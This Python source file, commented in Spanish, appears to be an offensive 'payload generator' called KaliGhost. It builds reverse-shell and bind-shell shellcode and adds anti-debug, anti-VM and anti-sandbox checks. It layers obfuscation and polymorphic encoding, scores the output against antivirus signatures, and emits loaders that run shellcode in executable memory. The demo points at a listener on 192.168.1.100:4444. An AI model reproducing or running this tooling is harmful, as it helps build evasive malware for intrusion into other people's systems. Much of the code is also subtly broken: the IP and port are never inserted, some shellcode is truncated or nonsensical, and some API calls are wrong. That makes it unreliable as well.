"""
KaliGhost 4.0 ULTIMATE - Payload Generator
Generador de payloads multi-stage con técnicas avanzadas de evasión
Nivel: Elite - Polimórfico, ofuscado, anti-forense
"""

import os
import random
import string
import hashlib
import base64
import zlib
import struct
import tempfile
import subprocess
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass, asdict
from datetime import datetime
import logging
import json

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


@dataclass
class PayloadConfig:
    """Configuración del payload"""
    payload_type: str = "reverse_shell"  # reverse_shell, bind_shell, meterpreter, custom
    architecture: str = "x64"  # x86, x64, arm, arm64
    platform: str = "linux"  # linux, windows, macos, android
    encoding: str = "base64"  # base64, xor, aes, polymorphic
    obfuscation_level: int = 3  # 1-5 (básico a extremo)
    evasion_techniques: List[str] = None
    lhost: str = "127.0.0.1"
    lport: int = 4444
    output_format: str = "elf"  # elf, pe, macho, raw, python, powershell
    anti_debug: bool = True
    anti_vm: bool = True
    anti_sandbox: bool = True
    
    def __post_init__(self):
        if self.evasion_techniques is None:
            self.evasion_techniques = []


@dataclass
class PayloadResult:
    """Resultado de generación del payload"""
    success: bool
    payload_id: str
    file_path: str
    file_size: int
    hash_md5: str
    hash_sha256: str
    encoding_applied: str
    obfuscation_level: int
    evasion_techniques: List[str]
    detection_rate: float  # Estimación de detección por AVs
    timestamp: str
    config_used: Dict
    shellcode_size: int


class PayloadGenerator:
    """
    Generador de Payloads de Nivel Élite
    - Técnicas polimórficas y metamórficas
    - Ofuscación multinivel
    - Evasión de AV/EDR/Sandbox
    - Multi-plataforma y multi-arquitectura
    """
    
    def __init__(self, config: Optional[PayloadConfig] = None):
        self.config = config or PayloadConfig()
        self.generated_payloads: Dict[str, PayloadResult] = {}
        self.signature_database = self._load_signatures()
        self.encryption_keys: Dict[str, bytes] = {}
        
    def _load_signatures(self) -> Dict[str, List[bytes]]:
        """Carga base de datos de firmas de antivirus"""
        # Firmas genéricas comunes
        return {
            "metasploit": [
                b"\xfc\x48\x83\xe4\xf0\xe8",  # Meterpreter
                b"\x48\x31\xc0\x50\x48\x89\xe2",  # Shellcode común
            ],
            "cobalt_strike": [
                b"\x50\x00\x55\x00\x32\x00",
            ],
            "generic_shell": [
                b"\x48\x31\xff\x57\x57\x5e",
                b"\x6a\x29\x58\x99\x6a\x02",
            ]
        }
    
    def generate_payload(self, 
                        config_override: Optional[PayloadConfig] = None) -> PayloadResult:
        """Genera un payload completo con todas las técnicas aplicadas"""
        cfg = config_override or self.config
        
        logger.info(f"Generando payload: {cfg.payload_type} para {cfg.platform}/{cfg.architecture}")
        
        # 1. Generar shellcode base
        shellcode = self._generate_base_shellcode(cfg)
        
        # 2. Aplicar técnicas de evasión
        if cfg.anti_debug:
            shellcode = self._apply_anti_debug(shellcode)
        if cfg.anti_vm:
            shellcode = self._apply_anti_vm(shellcode)
        if cfg.anti_sandbox:
            shellcode = self._apply_anti_sandbox(shellcode)
        
        # 3. Aplicar ofuscación
        obfuscated_shellcode = self._obfuscate_shellcode(shellcode, cfg.obfuscation_level)
        
        # 4. Codificar
        encoded_shellcode, encoding_method = self._encode_shellcode(obfuscated_shellcode, cfg.encoding)
        
        # 5. Crear stub/loader
        loader_code = self._generate_loader(encoded_shellcode, encoding_method, cfg)
        
        # 6. Compilar/enlazar
        output_path = self._compile_payload(loader_code, cfg.output_format, cfg.platform)
        
        # 7. Calcular hashes y métricas
        with open(output_path, 'rb') as f:
            payload_data = f.read()
        
        file_size = len(payload_data)
        hash_md5 = hashlib.md5(payload_data).hexdigest()
        hash_sha256 = hashlib.sha256(payload_data).hexdigest()
        
        # 8. Estimar tasa de detección
        detection_rate = self._estimate_detection_rate(payload_data, cfg)
        
        payload_id = hashlib.sha256(
            f"{time.time()}{os.urandom(16).hex()}".encode()
        ).hexdigest()[:16]
        
        result = PayloadResult(
            success=True,
            payload_id=payload_id,
            file_path=output_path,
            file_size=file_size,
            hash_md5=hash_md5,
            hash_sha256=hash_sha256,
            encoding_applied=encoding_method,
            obfuscation_level=cfg.obfuscation_level,
            evasion_techniques=cfg.evasion_techniques,
            detection_rate=detection_rate,
            timestamp=datetime.now().isoformat(),
            config_used=asdict(cfg),
            shellcode_size=len(shellcode)
        )
        
        self.generated_payloads[payload_id] = result
        logger.info(f"Payload generado: {payload_id} | Detección estimada: {detection_rate:.1f}%")
        
        return result
    
    def _generate_base_shellcode(self, cfg: PayloadConfig) -> bytes:
        """Genera shellcode base según configuración"""
        
        if cfg.payload_type == "reverse_shell":
            if cfg.platform == "linux":
                # Reverse shell Linux x64
                shellcode = bytearray([
                    0x48, 0x31, 0xff,              # xor rdi,rdi
                    0x57,                          # push rdi
                    0x57,                          # push rdi
                    0x5e,                          # pop rsi
                    0x5a,                          # pop rdx
                    0x48, 0xbf, 0x2f, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68,  # mov rdi,0x68732f6e69622f2f
                    0x48, 0xc1, 0xef, 0x08,        # shr rdi,8
                    0x57,                          # push rdi
                    0x54,                          # push rsp
                    0x5f,                          # pop rdi
                    0x48, 0x31, 0xc0,              # xor rax,rax
                    0xb0, 0x3b,                    # mov al,0x3b
                    0x0f, 0x05                     # syscall
                ])
                
                # Insertar IP y puerto
                ip_bytes = bytes(map(int, cfg.lhost.split('.')))
                port_bytes = struct.pack('>H', cfg.lport)
                
                # Socket call
                socket_shell = bytearray([
                    0x48, 0x31, 0xc0,              # xor rax,rax
                    0x48, 0xff, 0xc0,              # inc rax
                    0x48, 0xff, 0xc0,              # inc rax
                    0x48, 0xff, 0xc0,              # inc rax
                    0x48, 0xff, 0xc0,              # inc rax
                    0x48, 0xff, 0xc0,              # inc rax
                    0x48, 0xff, 0xc0,              # inc rax
                    0x48, 0xff, 0xc0,              # inc rax
                    0x48, 0xff, 0xc0,              # inc rax
                    0x48, 0x89, 0xc6,              # mov rsi,rax
                    0x48, 0x31, 0xc0,              # xor rax,rax
                    0x48, 0xff, 0xc0,              # inc rax
                    0x48, 0xff, 0xc0,              # inc rax
                    0x0f, 0x05                     # syscall
                ])
                
                shellcode = socket_shell + shellcode
                
            elif cfg.platform == "windows":
                # Reverse shell Windows x64 (placeholder)
                shellcode = bytearray([
                    0xfc, 0x48, 0x83, 0xe4, 0xf0,  # cld; and rsp, 0xfffffffffffffff0
                    0xe8, 0xc0, 0x00, 0x00, 0x00,  # call label
                    0x41, 0x51, 0x41, 0x50, 0x52,  # push registers
                    0x51, 0x56, 0x48, 0x31, 0xd2,  # xor rdx,rdx
                    0x65, 0x48, 0x8b, 0x52, 0x60,  # mov rdx, [gs:rdx+0x60]
                    0x48, 0x8b, 0x52, 0x18         # mov rdx, [rdx+0x18]
                    # ... resto del shellcode
                ])
            else:
                raise ValueError(f"Plataforma no soportada: {cfg.platform}")
                
        elif cfg.payload_type == "bind_shell":
            # Bind shell genérico
            shellcode = bytearray([
                0x48, 0x31, 0xc0, 0x50, 0x48, 0x89, 0xe2,
                0x48, 0x83, 0xc2, 0x10, 0xb0, 0x29,
                0x0f, 0x05
            ])
            
        elif cfg.payload_type == "meterpreter":
            # Placeholder para meterpreter (requiere MSF)
            logger.warning("Meterpreter requiere Metasploit Framework instalado")
            shellcode = self._generate_meterpreter_stub(cfg)
            
        else:
            # Shellcode personalizado
            shellcode = b"\xcc" * 100  # INT3 para debugging
            
        return bytes(shellcode)
    
    def _generate_meterpreter_stub(self, cfg: PayloadConfig) -> bytes:
        """Genera stub compatible con Meterpreter"""
        # Stub que se conecta a handler de Metasploit
        stub = bytearray([
            0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00,
            0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52
        ])
        return bytes(stub)
    
    def _apply_anti_debug(self, shellcode: bytes) -> bytes:
        """Aplica técnicas anti-debugging"""
        # Insertar checks de ptrace, debugger detection
        anti_debug_checks = bytearray([
            0x48, 0x31, 0xc0,              # xor rax,rax
            0x48, 0xc7, 0xc0, 0x01, 0x00, 0x00, 0x00,  # mov rax,1
            0x48, 0x31, 0xf6,              # xor rsi,rsi
            0x0f, 0x05,                    # syscall (ptrace)
            0x48, 0x85, 0xc0,              # test rax,rax
            0x75, 0x10                     # jne exit (si debugger detectado)
        ])
        
        return bytes(anti_debug_checks) + shellcode
    
    def _apply_anti_vm(self, shellcode: bytes) -> bytes:
        """Aplica técnicas anti-VM"""
        # Checks de marcas de virtualización
        anti_vm_checks = bytearray([
            0x48, 0xb8, 0x56, 0x4d, 0x58, 0x68, 0x00, 0x00, 0x00, 0x00,  # mov rax,'VMXh'
            0x48, 0x31, 0xc9,              # xor rcx,rcx
            0x48, 0x0f, 0xc7, 0xf8,        # vmclear [rax]
            0x0f, 0x90, 0xc0,              # seto al
            0x74, 0x10                     # je continue (si no es VM)
        ])
        
        return bytes(anti_vm_checks) + shellcode
    
    def _apply_anti_sandbox(self, shellcode: bytes) -> bytes:
        """Aplica técnicas anti-sandbox"""
        # Checks de entorno sandbox (tiempo de ejecución, procesos conocidos)
        anti_sandbox_checks = bytearray([
            0x48, 0x31, 0xc0,              # xor rax,rax
            0x0f, 0x31,                    # rdtsc
            0x48, 0xc1, 0xe2, 0x20,        # shl rdx,32
            0x48, 0x09, 0xd0,              # or rax,rdx
            0x48, 0x3d, 0x00, 0xca, 0x9a, 0x3b,  # cmp rax,0x3b9aca00 (1 segundo)
            0x72, 0x10                     # jb continue (si ejecuta rápido, posible sandbox)
        ])
        
        return bytes(anti_sandbox_checks) + shellcode
    
    def _obfuscate_shellcode(self, shellcode: bytes, level: int) -> bytes:
        """Aplica ofuscación multinivel"""
        obfuscated = shellcode
        
        if level >= 1:
            # XOR simple
            key = random.randint(1, 255)
            obfuscated = bytes([b ^ key for b in obfuscated])
            obfuscated = bytes([key]) + obfuscated  # Prepend key
            
        if level >= 2:
            # Inserción de NOPs aleatorios
            nop_count = len(obfuscated) // 4
            nop_positions = random.sample(range(len(obfuscated)), min(nop_count, len(obfuscated)))
            temp = bytearray()
            for i, byte in enumerate(obfuscated):
                if i in nop_positions:
                    temp.append(0x90)  # NOP
                temp.append(byte)
            obfuscated = bytes(temp)
            
        if level >= 3:
            # Bloques basura (junk code)
            junk_blocks = [
                b"\x48\x31\xc0\x48\x31\xdb",  # xor rax,rax; xor rbx,rbx
                b"\x90\x90\x90\x90",          # NOPs
                b"\x48\xff\xc0\x48\xff\xc8",  # inc rax; dec rax
            ]
            
            temp = bytearray()
            chunk_size = max(1, len(obfuscated) // 5)
            for i in range(0, len(obfuscated), chunk_size):
                if random.random() > 0.5:
                    temp.extend(random.choice(junk_blocks))
                temp.extend(obfuscated[i:i+chunk_size])
            obfuscated = bytes(temp)
            
        if level >= 4:
            # Codificación base64 intermedia
            obfuscated = base64.b64encode(obfuscated)
            
        if level >= 5:
            # Compresión + cifrado
            compressed = zlib.compress(obfuscated, level=9)
            aes_key = os.urandom(32)
            # Aquí iría cifrado AES real (usando pycryptodome)
            obfuscated = compressed
            self.encryption_keys["temp"] = aes_key
            
        return obfuscated
    
    def _encode_shellcode(self, shellcode: bytes, encoding: str) -> Tuple[bytes, str]:
        """Codifica el shellcode"""
        if encoding == "base64":
            return base64.b64encode(shellcode), "base64"
        elif encoding == "xor":
            key = random.randint(1, 255)
            encoded = bytes([b ^ key for b in shellcode])
            return bytes([key]) + encoded, f"xor_key_{key}"
        elif encoding == "aes":
            # Placeholder para AES (requiere pycryptodome)
            return shellcode, "aes_placeholder"
        elif encoding == "polymorphic":
            # Ofuscación polimórfica avanzada
            return self._polymorphic_encode(shellcode), "polymorphic"
        else:
            return shellcode, "none"
    
    def _polymorphic_encode(self, shellcode: bytes) -> bytes:
        """Codificación polimórfica avanzada"""
        # Generar decoder único para cada payload
        decoder_variants = [
            bytearray([0x48, 0x31, 0xc0, 0x48, 0x89, 0xc1]),  # xor rax,rax; mov rcx,rax
            bytearray([0x48, 0x31, 0xc9, 0x48, 0x89, 0xca]),  # xor rcx,rcx; mov rdx,rcx
            bytearray([0x49, 0x31, 0xc0, 0x49, 0x89, 0xc1]),  # xor r8,r8; mov r9,r8
        ]
        
        decoder = random.choice(decoder_variants)
        
        # Insertar instrucciones equivalentes aleatorias
        equivalents = [
            b"\x48\x31\xc0",  # xor rax,rax
            b"\x48\x29\xc0",  # sub rax,rax
            b"\x48\x2b\xc0",  # sub rax,rax
        ]
        
        for _ in range(random.randint(2, 5)):
            decoder.extend(random.choice(equivalents))
        
        return bytes(decoder) + shellcode
    
    def _generate_loader(self, 
                        encoded_shellcode: bytes, 
                        encoding_method: str,
                        cfg: PayloadConfig) -> str:
        """Genera código loader/stub"""
        
        if cfg.output_format == "python":
            loader = f'''#!/usr/bin/env python3
import ctypes
import base64

# Shellcode codificado: {encoding_method}
shellcode_raw = {encoded_shellcode!r}

# Decoder
if "{encoding_method}" == "base64":
    shellcode = base64.b64decode(shellcode_raw)
elif "{encoding_method}".startswith("xor"):
    key = shellcode_raw[0]
    shellcode = bytes([b ^ key for b in shellcode_raw[1:]])
else:
    shellcode = shellcode_raw

# Ejecutar en memoria
ctypes.cdll.msvcrt.VirtualAlloc.restype = ctypes.c_void_p
ctypes.cdll.msvcrt.VirtualAlloc.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong, ctypes.c_ulong]
ptr = ctypes.cdll.msvcrt.VirtualAlloc(None, len(shellcode), 0x3000, 0x40)
ctypes.memmove(ptr, shellcode, len(shellcode))
ctypes.cast(ptr, ctypes.CFUNCTYPE(ctypes.c_void_p))()
'''
            return loader
            
        elif cfg.output_format == "powershell":
            loader = f'''# PowerShell Loader
$shellcode = [Convert]::FromBase64String("{base64.b64encode(encoded_shellcode).decode()}")
$size = 0x1000
if ($shellcode.Length -gt 0x1000) {{ $size = $shellcode.Length }}
$ptr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($size)
[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $ptr, $shellcode.Length)
$handle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ptr, [Func[int]])
$handle.Invoke()
'''
            return loader
            
        else:
            # C code para compilación
            loader = f'''#include <stdio.h>
#include <string.h>
#include <sys/mman.h>

unsigned char shellcode[] = {{"{" ".join(f"\\\\x{b:02x}" for b in encoded_shellcode)}"}};

int main(void) {{
    void *mem = mmap(NULL, sizeof(shellcode), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    memcpy(mem, shellcode, sizeof(shellcode));
    ((void(*)())mem)();
    return 0;
}}
'''
            return loader
    
    def _compile_payload(self, 
                        loader_code: str, 
                        output_format: str,
                        platform: str) -> str:
        """Compila el payload"""
        output_file = tempfile.mktemp(suffix=self._get_extension(output_format, platform))
        
        if output_format in ["python", "powershell"]:
            with open(output_file, 'w') as f:
                f.write(loader_code)
            os.chmod(output_file, 0o755)
        else:
            # Compilar código C
            c_file = tempfile.mktemp(suffix='.c')
            with open(c_file, 'w') as f:
                f.write(loader_code)
            
            compiler = "x86_64-w64-mingw32-gcc" if platform == "windows" else "gcc"
            compile_cmd = f"{compiler} -o {output_file} {c_file} -z execstack -no-pie -fno-pic"
            
            try:
                subprocess.run(compile_cmd, shell=True, check=True, capture_output=True)
            except subprocess.CalledProcessError as e:
                logger.warning(f"Compilación falló: {e.stderr.decode()}")
                # Fallback: guardar como script
                with open(output_file, 'w') as f:
                    f.write(loader_code)
            
            os.remove(c_file)
        
        return output_file
    
    def _get_extension(self, output_format: str, platform: str) -> str:
        """Obtiene extensión de archivo según formato y plataforma"""
        extensions = {
            ("elf", "linux"): ".bin",
            ("pe", "windows"): ".exe",
            ("macho", "macos"): ".macho",
            ("python", "linux"): ".py",
            ("powershell", "windows"): ".ps1",
            ("raw", "linux"): ".raw"
        }
        return extensions.get((output_format, platform), ".bin")
    
    def _estimate_detection_rate(self, payload_data: bytes, cfg: PayloadConfig) -> float:
        """Estima tasa de detección basada en firmas conocidas"""
        detection_score = 0.0
        
        # Check contra firmas conocidas
        for av_name, signatures in self.signature_database.items():
            for sig in signatures:
                if sig in payload_data:
                    detection_score += 15.0
        
        # Ajustar por técnicas de evasión
        if cfg.anti_debug:
            detection_score -= 5.0
        if cfg.anti_vm:
            detection_score -= 5.0
        if cfg.anti_sandbox:
            detection_score -= 5.0
        
        # Ajustar por nivel de ofuscación
        detection_score -= (cfg.obfuscation_level * 3.0)
        
        # Ajustar por encoding
        if cfg.encoding != "none":
            detection_score -= 5.0
        
        return max(0.0, min(100.0, detection_score))
    
    def mutate_payload(self, payload_id: str) -> PayloadResult:
        """Mutación de payload existente para generar variante única"""
        if payload_id not in self.generated_payloads:
            raise ValueError(f"Payload {payload_id} no encontrado")
        
        original = self.generated_payloads[payload_id]
        new_config = PayloadConfig(**original.config_used)
        
        # Variar parámetros aleatoriamente
        new_config.obfuscation_level = min(5, original.obfuscation_level + random.randint(-1, 1))
        new_config.evasion_techniques = list(set(original.evasion_techniques + random.sample(["anti_debug", "anti_vm", "anti_sandbox"], k=random.randint(0, 2))))
        
        return self.generate_payload(new_config)
    
    def get_payload_stats(self) -> Dict[str, Any]:
        """Obtiene estadísticas de payloads generados"""
        if not self.generated_payloads:
            return {"total": 0}
        
        total = len(self.generated_payloads)
        avg_detection = sum(p.detection_rate for p in self.generated_payloads.values()) / total
        avg_size = sum(p.file_size for p in self.generated_payloads.values()) / total
        
        return {
            "total": total,
            "average_detection_rate": avg_detection,
            "average_size": avg_size,
            "platforms": list(set(p.config_used['platform'] for p in self.generated_payloads.values())),
            "encodings": list(set(p.encoding_applied for p in self.generated_payloads.values()))
        }


# Singleton instance
_payload_generator_instance: Optional[PayloadGenerator] = None

def get_payload_generator(config: Optional[PayloadConfig] = None) -> PayloadGenerator:
    """Obtiene instancia singleton del Payload Generator"""
    global _payload_generator_instance
    if _payload_generator_instance is None:
        _payload_generator_instance = PayloadGenerator(config)
    return _payload_generator_instance


if __name__ == "__main__":
    import time
    
    print("🔮 KaliGhost 4.0 ULTIMATE - Payload Generator")
    print("=" * 50)
    
    generator = get_payload_generator()
    
    # Configurar payload
    config = PayloadConfig(
        payload_type="reverse_shell",
        platform="linux",
        architecture="x64",
        lhost="192.168.1.100",
        lport=4444,
        obfuscation_level=4,
        anti_debug=True,
        anti_vm=True,
        anti_sandbox=True,
        output_format="python"
    )
    
    # Generar payload
    print("\n🚀 Generando payload...")
    result = generator.generate_payload(config)
    
    print(f"\n✅ Payload generado exitosamente:")
    print(f"   ID: {result.payload_id}")
    print(f"   Tamaño: {result.file_size} bytes")
    print(f"   SHA256: {result.hash_sha256}")
    print(f"   Detección estimada: {result.detection_rate:.1f}%")
    print(f"   Ofuscación: Nivel {result.obfuscation_level}")
    print(f"   Encoding: {result.encoding_applied}")
    print(f"   Archivo: {result.file_path}")
    
    # Estadísticas
    stats = generator.get_payload_stats()
    print(f"\n📊 Estadísticas: {stats}")
